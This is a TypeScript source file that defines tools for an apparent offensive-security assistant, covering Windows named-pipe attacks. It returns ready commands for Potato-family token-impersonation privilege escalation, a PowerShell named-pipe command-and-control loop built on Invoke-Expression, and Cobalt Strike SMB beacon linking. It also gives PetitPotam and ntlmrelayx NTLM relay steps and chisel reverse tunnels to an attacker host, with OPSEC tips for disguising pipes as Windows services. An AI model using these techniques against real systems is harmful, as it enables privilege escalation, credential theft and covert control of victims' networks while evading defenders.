import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { EnvironmentModel } from "../schema/environment.js";
import type { Platform } from "../schema/unified-entry.js";

function lookupSession(envId: string, ctx: ToolContext): EnvironmentModel | null {
  return ctx.sessions.get(envId) ?? null;
}

interface NamedPipeTechnique {
  technique: string;
  description: string;
  platform: Platform | "multi";
  binary: string;
  command: string;
  cleanup_command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
  opsec_considerations: string;
}

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id,
    binary: e.binary,
    platform: e.platform,
    catalog: e.catalogSource,
    functions: e.functions,
    stealth_score: e.stealthScore,
    description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

// ── pipe_impersonation ────────────────────────────────────────────────────────

const pipe_impersonation: ToolDef = {
  name: "pipe_impersonation",
  description:
    "Find named pipe impersonation techniques for token stealing and privilege escalation on Windows by creating rogue named pipes",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (named pipe impersonation is Windows-specific)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbPrivesc = ctx.knowledgeBase.searchByFunction("privilege_escalation", platform);
    const kbCredAccess = ctx.knowledgeBase.searchByFunction("credential_access", platform);
    const kbPipe = ctx.knowledgeBase.searchByKeyword("pipe", platform);
    const kbEntries = deduplicateByBinary([...kbPrivesc, ...kbCredAccess, ...kbPipe])
      .filter(e => e.platform === platform);

    const techniques: NamedPipeTechnique[] = [
      {
        technique: "PrintSpoofer (Pipe Potato)",
        description: "Abuse the Print Spooler service by creating a named pipe that captures a SYSTEM-level connection, then impersonate the token for privilege escalation",
        platform,
        binary: "PrintSpoofer.exe",
        command: 'PrintSpoofer.exe -i -c "cmd.exe"',
        cleanup_command: "Terminate the elevated cmd.exe session",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege", "Service account context (e.g., IIS, SQL Server)"],
        detection_notes: "PrintSpoofer binary execution. Sysmon pipe creation events (Event ID 17/18). Named pipe \\\\\\pipe\\spoolss connections.",
        opsec_considerations: "Requires SeImpersonatePrivilege — typically available to service accounts. Very fast execution.",
      },
      {
        technique: "JuicyPotato / RoguePotato",
        description: "Create a rogue COM server that forces a SYSTEM-level DCOM activation to connect to an attacker-controlled named pipe for token capture",
        platform,
        binary: "JuicyPotato.exe",
        command: 'JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami > C:\\out.txt" -t *',
        cleanup_command: "Terminate spawned process and clean up output file",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege", "Vulnerable CLSID with LocalService activation (Windows Server 2016/2019)"],
        detection_notes: "Unusual COM activation. Named pipe creation. Process creation from service account context.",
        opsec_considerations: "JuicyPotato is patched on Windows 10 1809+/Server 2019+. Use RoguePotato or PrintSpoofer on newer systems.",
      },
      {
        technique: "GodPotato (Universal Potato)",
        description: "Exploit the RPCSS service to trigger SYSTEM-level named pipe impersonation, working on Windows 10/11 and Server 2019/2022",
        platform,
        binary: "GodPotato.exe",
        command: 'GodPotato.exe -cmd "cmd /c whoami > C:\\out.txt"',
        cleanup_command: "Clean up output file on target",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege", "Works on modern Windows including Server 2022"],
        detection_notes: "Process creation from service account. RPCSS interactions. Named pipe events.",
        opsec_considerations: "Works on latest Windows versions. Single binary, no additional dependencies.",
      },
      {
        technique: "Custom Named Pipe Server Impersonation",
        description: "Create a custom named pipe server that waits for a privileged client to connect, then call ImpersonateNamedPipeClient() to steal their token",
        platform,
        binary: "powershell.exe",
        command: `# PowerShell named pipe impersonation skeleton
$pipeSecurity = New-Object System.IO.Pipes.PipeSecurity
$pipeSecurity.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule("Everyone","FullControl","Allow")))
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("legit_pipe","InOut",1,"Byte","None",1024,1024,$pipeSecurity)
Write-Host "Waiting for client connection..."
$pipe.WaitForConnection()
# After connection: kernel32::ImpersonateNamedPipeClient via P/Invoke`,
        cleanup_command: "$pipe.Disconnect(); $pipe.Dispose()",
        stealth_score: 1,
        attck_ids: ["T1134.001"],
        prerequisites: ["Ability to create named pipes", "Knowledge of pipe names used by privileged services"],
        detection_notes: "Named pipe creation events. Sysmon Event ID 17 (PipeEvent). Unusual named pipes.",
        opsec_considerations: "Must name the pipe to match what a privileged service expects. Timing-dependent.",
      },
      {
        technique: "Service Account Pipe Impersonation (EfsPotato)",
        description: "Abuse the Encrypting File System (EFS) service to coerce a SYSTEM connection to an attacker-controlled named pipe",
        platform,
        binary: "EfsPotato.exe",
        command: 'EfsPotato.exe "cmd.exe /c whoami > C:\\out.txt"',
        cleanup_command: "Clean up output file",
        stealth_score: 2,
        attck_ids: ["T1134.001"],
        prerequisites: ["SeImpersonatePrivilege", "EFS service running"],
        detection_notes: "EFS RPC calls. Named pipe creation. Process creation from service context.",
        opsec_considerations: "Variant that uses EFS instead of Print Spooler — useful when Spooler is disabled.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      const hasImpersonatePriv = session.state.tokenPrivileges.some(p =>
        p.toLowerCase().includes("seimpersonate") || p.toLowerCase().includes("seassignprimarytoken"),
      );

      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        token_privileges: session.state.tokenPrivileges,
        has_impersonate_privilege: hasImpersonatePriv,
        edr_detected: session.state.edrDetected,
        recommendations: hasImpersonatePriv
          ? "SeImpersonatePrivilege detected — Potato family exploits (PrintSpoofer, GodPotato) are directly applicable for SYSTEM elevation."
          : "SeImpersonatePrivilege not detected. Named pipe impersonation requires service account context or specific privileges.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── pipe_c2_channel ───────────────────────────────────────────────────────────

const pipe_c2_channel: ToolDef = {
  name: "pipe_c2_channel",
  description:
    "Find named pipe C2 communication channel techniques for covert command-and-control via SMB named pipes without direct network connections",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (named pipe C2 is primarily Windows)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbC2 = ctx.knowledgeBase.searchByFunction("c2", platform);
    const kbPipe = ctx.knowledgeBase.searchByKeyword("pipe", platform);
    const kbSmb = ctx.knowledgeBase.searchByKeyword("SMB", platform);
    const kbEntries = deduplicateByBinary([...kbC2, ...kbPipe, ...kbSmb])
      .filter(e => e.platform === platform);

    const techniques: NamedPipeTechnique[] = [
      {
        technique: "Cobalt Strike SMB Beacon (Named Pipe)",
        description: "Use Cobalt Strike's SMB beacon to chain implants via named pipes, allowing internal hosts without internet access to communicate through a pivot host",
        platform,
        binary: "beacon.exe",
        command: "# Cobalt Strike: Listeners > Add > Beacon SMB > Set pipe name (default: \\\\.\\pipe\\msagent_##)\n# Then: link <TARGET> <PIPE_NAME>",
        cleanup_command: "unlink <TARGET> in Cobalt Strike console",
        stealth_score: 1,
        attck_ids: ["T1071", "T1570"],
        prerequisites: ["Initial beacon on pivot host", "SMB access (port 445) between hosts", "Admin credentials for target"],
        detection_notes: "Named pipe creation with unusual names. SMB traffic patterns. Sysmon Event ID 17/18 for pipe events.",
        opsec_considerations: "Change default pipe name — msagent_## is a known IOC. Use custom pipe names that blend with legitimate software.",
      },
      {
        technique: "PoshC2 Named Pipe Implant",
        description: "Use PoshC2's named pipe communication for daisy-chaining implants within a network segment",
        platform,
        binary: "powershell.exe",
        command: '# PoshC2 daisy-chain: Create named pipe server on pivot, pipe clients on internal hosts\nNew-Object System.IO.Pipes.NamedPipeServerStream("PoshC2Pipe","InOut")',
        cleanup_command: "Terminate PoshC2 implant processes",
        stealth_score: 1,
        attck_ids: ["T1071", "T1570"],
        prerequisites: ["PoshC2 framework deployed", "SMB connectivity between hosts"],
        detection_notes: "PowerShell process with pipe operations. Named pipe creation events. Script block logging.",
        opsec_considerations: "PowerShell-based — subject to AMSI and script block logging. Consider CLR-based alternatives.",
      },
      {
        technique: "Custom SMB Pipe C2 via PowerShell",
        description: "Build a custom C2 channel using .NET NamedPipeServerStream/NamedPipeClientStream for command execution over SMB",
        platform,
        binary: "powershell.exe",
        command: `# Server (pivot host):
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream("svcctl","InOut",10,"Byte","None",4096,4096,$null)
$pipe.WaitForConnection()
$reader = New-Object System.IO.StreamReader($pipe)
$writer = New-Object System.IO.StreamWriter($pipe)
while ($true) { $cmd = $reader.ReadLine(); $out = Invoke-Expression $cmd 2>&1 | Out-String; $writer.WriteLine($out); $writer.Flush() }`,
        cleanup_command: "$pipe.Disconnect(); $pipe.Dispose()",
        stealth_score: 1,
        attck_ids: ["T1071", "T1059.001"],
        prerequisites: ["PowerShell access on both endpoints", "SMB access between hosts"],
        detection_notes: "PowerShell with System.IO.Pipes namespace. Named pipe creation. Invoke-Expression usage.",
        opsec_considerations: "Name the pipe after legitimate Windows services (e.g., svcctl, srvsvc) to blend with normal traffic.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        amsi_enabled: session.state.amsiEnabled,
        recommendations: session.state.networkAccess.internalSubnets.length > 0
          ? `Internal subnets detected: ${session.state.networkAccess.internalSubnets.join(", ")}. Named pipe C2 via SMB is ideal for pivoting to hosts without direct internet access.`
          : "No internal subnet data. Named pipe C2 is primarily useful for internal pivoting within a compromised network.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── pipe_relay ────────────────────────────────────────────────────────────────

const pipe_relay: ToolDef = {
  name: "pipe_relay",
  description:
    "Find named pipe relay and forwarding techniques for proxying traffic, NTLM relay, and cross-protocol bridging via named pipes",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows"])
      .default("windows")
      .describe("Target platform (named pipe relay is primarily Windows)"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform: Platform = "windows";
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbLateral = ctx.knowledgeBase.searchByFunction("lateral_movement", platform);
    const kbPipe = ctx.knowledgeBase.searchByKeyword("pipe", platform);
    const kbRelay = ctx.knowledgeBase.searchByKeyword("relay", platform);
    const kbEntries = deduplicateByBinary([...kbLateral, ...kbPipe, ...kbRelay])
      .filter(e => e.platform === platform);

    const techniques: NamedPipeTechnique[] = [
      {
        technique: "NTLM Relay via Named Pipe (PetitPotam + ntlmrelayx)",
        description: "Coerce NTLM authentication to an attacker-controlled named pipe or SMB share, then relay the credentials to another target",
        platform,
        binary: "ntlmrelayx.py",
        command: "# Step 1: Start relay\nntlmrelayx.py -t ldaps://<DC_IP> -smb2support\n# Step 2: Coerce authentication\nPetitPotam.py <ATTACKER_IP> <TARGET_IP>",
        cleanup_command: "Stop ntlmrelayx process",
        stealth_score: 2,
        attck_ids: ["T1557.001", "T1187"],
        prerequisites: ["SMB signing not enforced on target", "Network position between victim and relay target"],
        detection_notes: "NTLM authentication to unusual destinations. SMB relay indicators. Event ID 4624 from unexpected sources.",
        opsec_considerations: "SMB signing enforcement blocks this attack. Check signing status before attempting.",
      },
      {
        technique: "Named Pipe to TCP Bridge",
        description: "Create a bridge between a named pipe and a TCP socket to tunnel network traffic through named pipes",
        platform,
        binary: "powershell.exe",
        command: `# Bridge named pipe to TCP socket
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".","legit_pipe","InOut")
$pipe.Connect()
$tcp = New-Object System.Net.Sockets.TcpClient("<TARGET>",443)
$tcpStream = $tcp.GetStream()
# Bidirectional copy between pipe and TCP stream`,
        cleanup_command: "$pipe.Dispose(); $tcp.Close()",
        stealth_score: 1,
        attck_ids: ["T1570", "T1090.001"],
        prerequisites: ["Named pipe access", "TCP network access"],
        detection_notes: "Named pipe operations combined with network connections. PowerShell script block logging.",
        opsec_considerations: "Allows tunneling arbitrary protocols through named pipes — useful for bypassing network segmentation.",
      },
      {
        technique: "Pipe Relay via chisel/ligolo (SMB Transport)",
        description: "Use reverse tunneling tools that support named pipe transport for pivoting through compromised hosts",
        platform,
        binary: "chisel.exe",
        command: "# Attacker: chisel server --reverse --port 8080\n# Victim: chisel client --pipe <ATTACKER_IP>:8080 R:socks",
        cleanup_command: "Terminate chisel process",
        stealth_score: 2,
        attck_ids: ["T1570", "T1090.001"],
        prerequisites: ["chisel binary on victim", "Network access to attacker"],
        detection_notes: "chisel binary execution. Unusual network tunneling patterns. Process creation events.",
        opsec_considerations: "chisel supports TLS and can use named pipes as transport — reduces network-level detection.",
      },
    ];

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        network_access: session.state.networkAccess,
        edr_detected: session.state.edrDetected,
        recommendations: session.state.networkAccess.internalSubnets.length > 0
          ? "Internal subnets available. Named pipe relay is effective for bridging network segments and relaying credentials between hosts."
          : "No internal subnet data. Assess network topology before deploying relay techniques.",
      };
    }

    return json({
      platform,
      total_techniques: techniques.length,
      techniques,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── pipe_discovery ────────────────────────────────────────────────────────────

const pipe_discovery: ToolDef = {
  name: "pipe_discovery",
  description:
    "Enumerate and discover named pipes on Windows and Linux for identifying IPC channels, vulnerable pipe servers, and potential impersonation targets",
  schema: {
    environment_id: z
      .string()
      .optional()
      .describe("Environment session ID to contextualize results with parsed environment data"),
    platform: z
      .enum(["windows", "linux"])
      .default("windows")
      .describe("Target platform for named pipe enumeration"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const platform = args.platform as Platform;
    const session = args.environment_id ? lookupSession(args.environment_id, ctx) : null;

    const kbRecon = ctx.knowledgeBase.searchByFunction("reconnaissance", platform);
    const kbPipe = ctx.knowledgeBase.searchByKeyword("pipe", platform);
    const kbEntries = deduplicateByBinary([...kbRecon, ...kbPipe])
      .filter(e => e.platform === platform);

    const windowsCommands = [
      {
        name: "List All Named Pipes (PowerShell)",
        description: "Enumerate all currently open named pipes on the local system",
        command: "Get-ChildItem \\\\.\\pipe\\ | Select-Object Name, Length | Sort-Object Name",
        purpose: "Discover all active named pipes for further analysis",
      },
      {
        name: "List Named Pipes (cmd)",
        description: "Use native dir command to list named pipes",
        command: "dir \\\\.\\pipe\\",
        purpose: "Quick enumeration without PowerShell dependency",
      },
      {
        name: "Get Pipe Security Descriptors",
        description: "Enumerate named pipe permissions to find pipes with weak ACLs",
        command: `Get-ChildItem \\\\.\\pipe\\ | ForEach-Object { $name = $_.Name; try { $pipe = [System.IO.Pipes.NamedPipeClientStream]::new(".", $name, "Read"); $pipe.Dispose(); [PSCustomObject]@{ Name = $name; Readable = $true } } catch { [PSCustomObject]@{ Name = $name; Readable = $false } } }`,
        purpose: "Identify pipes with overly permissive access controls for impersonation",
      },
      {
        name: "Identify Pipe Owner Processes",
        description: "Use handle.exe (Sysinternals) to map named pipes to their owning processes",
        command: "handle.exe -a -p 0 -nobanner | findstr /i pipe",
        purpose: "Determine which processes own which pipes — identify SYSTEM-owned pipes for impersonation",
      },
      {
        name: "Remote Pipe Enumeration via SMB",
        description: "Enumerate named pipes on a remote host via SMB using crackmapexec or smbclient",
        command: "crackmapexec smb <TARGET> -u <USER> -p <PASS> --pipes",
        purpose: "Discover accessible named pipes on remote hosts for lateral movement or relay attacks",
      },
    ];

    const linuxCommands = [
      {
        name: "List Named Pipes (find)",
        description: "Find all named pipes (FIFOs) on the Linux filesystem",
        command: "find / -type p 2>/dev/null",
        purpose: "Discover all FIFO special files on the system",
      },
      {
        name: "List Unix Domain Sockets",
        description: "Enumerate Unix domain sockets which serve similar IPC purposes",
        command: "find / -type s 2>/dev/null | head -50",
        purpose: "Discover IPC sockets that may be vulnerable to impersonation or hijacking",
      },
      {
        name: "Check Pipe/Socket Permissions",
        description: "Find world-writable pipes and sockets",
        command: "find / \\( -type p -o -type s \\) -perm -o=w 2>/dev/null",
        purpose: "Identify pipes/sockets with weak permissions for potential abuse",
      },
      {
        name: "List Abstract Unix Sockets",
        description: "Enumerate abstract Unix domain sockets via /proc/net/unix",
        command: "cat /proc/net/unix | awk '{print $NF}' | sort -u | head -50",
        purpose: "Discover abstract sockets that cannot be found via filesystem enumeration",
      },
    ];

    const commands = platform === "windows" ? windowsCommands : linuxCommands;

    let sessionContext: Record<string, unknown> | null = null;
    if (session) {
      sessionContext = {
        environment_id: session.id,
        privilege_level: session.state.privilegeLevel,
        platform: session.state.platform,
        recommendations: platform === "windows"
          ? "Enumerate pipes first, then check for SYSTEM-owned pipes with weak ACLs for impersonation opportunities."
          : "Look for world-writable FIFOs and sockets. Check for Docker sockets (/var/run/docker.sock) for container escape.",
      };
    }

    return json({
      platform,
      total_commands: commands.length,
      enumeration_commands: commands,
      kb_entries: kbEntries.slice(0, 10).map(summarizeKbEntry),
      session_context: sessionContext,
    });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const namedPipeTools: ToolDef[] = [
  pipe_impersonation,
  pipe_c2_channel,
  pipe_relay,
  pipe_discovery,
];
